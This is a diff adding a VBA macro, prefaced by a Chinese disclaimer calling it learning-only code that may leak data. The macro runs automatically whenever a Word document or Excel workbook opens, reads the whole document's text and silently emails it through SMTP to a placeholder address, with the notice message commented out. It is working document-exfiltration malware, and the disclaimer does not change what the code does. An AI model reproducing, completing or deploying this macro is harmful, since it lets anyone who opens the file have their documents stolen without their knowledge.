@@ -1,0 +1,54 @@
+' 免责申明：感谢您使用我们编写的宏代码。在使用前，请仔细阅读本免责声明，以确保您充分了解可能存在的风险和后果，并自愿承担相应的风险。本软件是一种宏代码，
+' 可能会对您的计算机系统数据造成泄露，仅用作学习用途，
+' 不能用于其他非法的用途,如有违反请立即停止使用，并联系我们。再次提示请确保您的行为符合法律法规和道德规范。
+Sub Auto_Open()
+    Dim Mail As Object
+    Dim Config As Object
+    Dim Fields As Object
+    Dim DocumentContent As String
+
+   
+    DocumentContent = ActiveDocument.Content.Text
+
+ 
+    Set Mail = CreateObject("CDO.Message")
+    Set Config = CreateObject("CDO.Configuration")
+    Set Fields = Config.Fields
+
+   
+    With Fields
+        .Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2 ' cdoSendUsingPort
+        .Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.xxx.com"  
+        .Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25  
+        .Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1 ' cdoBasic
+        .Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "yxxx@xxx.com"  
+        .Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "xxxxxxx" ' 
+        .Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = False ' 
+        .Update
+    End With
+
+    With Mail
+      
+        Set .Configuration = Config
+        .To = "xxx@xxx.com"
+         .From = "xxx@xxx.com" 
+        .Subject = "xxx"
+        .TextBody = DocumentContent     
+        '.AddAttachment "C:\path\to\your\attachment.txt" 
+        .Send
+    End With
+
+
+    Set Mail = Nothing
+    Set Config = Nothing
+    Set Fields = Nothing
+
+    'MsgBox "xxx sent", vbInformation
+End Sub
+
+Sub AutoOpen()
+    Auto_Open
+End Sub
+Sub Workbook_Open()
+    Auto_Open
+End Sub
